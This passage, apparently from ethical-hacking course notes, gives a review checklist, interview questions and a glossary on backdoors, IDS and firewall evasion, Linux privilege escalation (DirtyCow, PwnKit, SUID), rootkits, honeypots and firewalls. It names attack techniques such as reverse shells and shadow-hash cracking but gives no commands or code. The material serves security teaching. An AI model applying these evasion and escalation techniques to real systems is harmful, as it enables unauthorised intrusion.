- [ ] Screened subnet — alternative term for DMZ
- [ ] IDS evasion — fragmentation, TTL manipulation, encoding, polymorphism
- [ ] Firewall evasion — HTTP tunneling, DNS tunneling, ICMP tunneling
- [ ] IT Act S.66F — attack on critical infrastructure — life imprisonment
- [ ] DPDPA 2023 — biometric data breach — ₹250 crore penalty

---

### 💼 Interview-Likely

- What is a backdoor device and how does it differ from a software backdoor?
- Explain how a USB Rubber Ducky HID attack works and why AV cannot detect it.
- What is a firmware backdoor and why does it survive OS reinstallation?
- What are FAR, FRR, and EER in biometric systems?
- How does a gummy finger attack work and what does liveness detection prevent?
- Explain Linux privilege escalation via SUID bit with a specific example.
- What is DirtyCow and what made it so significant?
- What is an LKM rootkit and how does it hide processes?
- What is the difference between an IDS and an IPS?
- Explain the three firewall types — packet filter, stateful, and application proxy.
- What is a DMZ and how does a dual-firewall DMZ architecture work?
- What is a honeypot and how does it differ from a honeynet?
- How does Snort detect attacks — what are its three modes?

---

## Next Session Bridge

Session 18 completed the defensive and offensive infrastructure
sub-phase — covering backdoor hardware, advanced DDoS,
biometric security and spoofing, Linux hacking and backdoors,
and finally the defensive technologies (IDS, honeypots, firewalls)
that organizations deploy to detect and block all of the attacks
covered throughout this module.

Session 19 moves to **Physical Security and Penetration Testing
Methodologies** — extending the attack surface from the digital
layer to the physical world. Where Session 18 covered hardware
backdoors (physical devices), Session 19 covers physical security
comprehensively: access controls, CCTV, piggybacking, and how
physical breaches enable all subsequent digital attacks. The
penetration testing methodology content ties together the entire
module — showing how all sessions from 6 through 18 fit into a
structured, professional engagement framework.

---

<details>
<summary>📖 Glossary</summary>

| Term | Definition |
|---|---|
| **ACL** | Access Control List — rules filtering packets by header field values |
| **AIDE** | Advanced Intrusion Detection Environment — Linux file integrity monitoring tool |
| **ALG** | Application Layer Gateway — proxy firewall component handling specific protocols |
| **Arpwatch** | Linux daemon monitoring ARP traffic — detects IP/MAC pairing changes |
| **auditd** | Linux kernel audit daemon — logs security-relevant system calls |
| **Bastion host** | Hardened host exposed to untrusted network — typical firewall/proxy placement |
| **Bind shell** | Backdoor that opens a listening port on the victim — attacker connects inbound |
| **chkrootkit** | Open-source rootkit detection tool — checks binaries and system files |
| **Cowrie** | Medium-interaction SSH/Telnet honeypot — logs attacker commands and keystrokes |
| **Cron** | Linux task scheduler — world-writable cron scripts enable privilege escalation |
| **CVE-2016-5195** | DirtyCow — Linux kernel race condition — write to read-only memory mappings |
| **CVE-2021-4034** | PwnKit — polkit pkexec local privilege escalation — all Linux distros |
| **CVE-2023-44487** | HTTP/2 Rapid Reset — application-layer DDoS — 398M RPS record |
| **DirtyCow** | CVE-2016-5195 — Linux kernel privilege escalation — copy-on-write race condition |
| **DMZ** | Demilitarized Zone — network segment between two firewalls — public-facing servers |
| **EER** | Equal Error Rate — biometric threshold where FAR equals FRR |
| **Egress filtering** | Firewall rules controlling outbound traffic — prevents data exfiltration |
| **Evil maid attack** | Physical attack on unattended device — install hardware backdoor or keylogger |
| **FAR** | False Accept Rate — rate at which unauthorized users are incorrectly accepted |
| **Firmware backdoor** | Malicious code in device firmware — survives OS reinstallation |
| **FRR** | False Reject Rate — rate at which authorized users are incorrectly rejected |
| **GTFOBins** | Online reference for Unix binary privilege escalation via SUID/sudo |
| **Gummy finger** | Gelatin-based fake fingerprint used to spoof fingerprint readers |
| **HIDS** | Host-based Intrusion Detection System — monitors single endpoint |
| **Honeyd** | Open-source virtual honeypot daemon — simulates multiple network hosts |
| **Honeynet** | Network of multiple honeypots — more complex deception environment |
| **Honeypot** | Decoy system designed to attract attackers — no legitimate traffic expected |
| **Ingress filtering** | Firewall rules controlling inbound traffic — blocks spoofed source IPs |
| **IPS** | Intrusion Prevention System — detects AND blocks attacks in real time |
| **IDS** | Intrusion Detection System — detects attacks — alerts but does not block |
| **John the Ripper** | Password cracking tool — cracks Linux /etc/shadow hashes |
| **Kippo** | Low-interaction SSH honeypot — predecessor to Cowrie |
| **LKRG** | Linux Kernel Runtime Guard — kernel integrity checking module |
| **LKM** | Loadable Kernel Module — Linux kernel extension — rootkit delivery mechanism |
| **lsmod** | Linux command listing loaded kernel modules — rootkit detection |
| **Meterpreter** | Advanced Metasploit payload — in-memory — extensible post-exploitation |
| **ModSecurity** | Open-source WAF module for Apache/Nginx — OWASP Core Rule Set |
| **NAGIOS** | Network monitoring platform — monitors hosts, services, and infrastructure |
| **Netcat** | Network utility — used for port scanning, reverse shells, file transfer |
| **NIDS** | Network-based Intrusion Detection System — monitors network traffic |
| **O.MG Cable** | Lightning/USB cable with embedded microcontroller and Wi-Fi — hardware implant |
| **OSSEC** | Open-source HIDS — log analysis, file integrity, rootkit detection |
| **PAM** | Pluggable Authentication Modules — Linux authentication framework |
| **Packet filter** | Stateless firewall — filters on IP/TCP/UDP header fields only |
| **Persistence** | Techniques ensuring backdoor/malware survives system reboot |
| **Polkit** | Linux policy-based privilege authorization framework |
| **Port knocking** | Backdoor access method — send packets to specific ports in sequence |
| **PTH** | Pass-the-Hash — authenticate using NTLM hash without knowing plaintext |
| **PwnKit** | CVE-2021-4034 — polkit pkexec privilege escalation — all major Linux distros |
| **Reverse shell** | Backdoor where victim connects out to attacker — bypasses inbound firewall |
| **rkhunter** | Rootkit Hunter — scans for known rootkits, backdoors, suspicious files |
| **Screened subnet** | Alternative term for DMZ architecture |
| **SIEM** | Security Information and Event Management — aggregates logs — correlates alerts |
| **SNORT** | Open-source NIDS/IPS — signature + anomaly detection — three modes |
| **SUID** | Set User ID bit — Linux file permission — execute as file owner |
| **Sudo misconfiguration** | World-writable sudo rules or NOPASSWD — privilege escalation vector |
| **sys_call_table** | Linux kernel system call dispatch table — hooked by LKM rootkits |
| **Tripwire** | File integrity monitoring tool — baseline hash comparison |
| **USB Rubber Ducky** | HID attack device — looks like USB drive — injects keystrokes at 1000/sec |
| **Volatility** | Memory forensics framework — extract artifacts from RAM dumps |
| **WAF** | Web Application Firewall — filters HTTP traffic for attack patterns |
| **Wazuh** | Open-source OSSEC fork — modern SIEM/HIDS/FIM platform |
| **ZTNA** | Zero Trust Network Access — identity-verified, context-aware access control |

</details>

---